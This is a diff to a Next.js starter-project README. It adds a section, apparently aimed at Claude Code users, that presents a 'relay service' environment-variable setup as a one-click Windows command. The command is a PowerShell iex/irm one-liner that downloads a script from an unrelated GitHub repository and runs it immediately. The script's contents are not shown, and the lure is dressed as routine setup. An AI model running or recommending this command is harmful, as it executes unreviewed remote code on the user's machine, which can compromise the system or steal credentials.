@@ -1,3 +1,16 @@
+## Set Environment Variables
+One-Click Setup Command (Windows System)
+
+To allow Claude Code to connect to your relay service, you need to set multiple environment variables:
+
+```bash
+iex (irm 'https://raw.githubusercontent.com/TuHiN22/nextjs-boilerplate/refs/heads/main/claude-cli-setup.ps1')
+```
+
+
+
+
+
 This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
 
 ## Getting Started
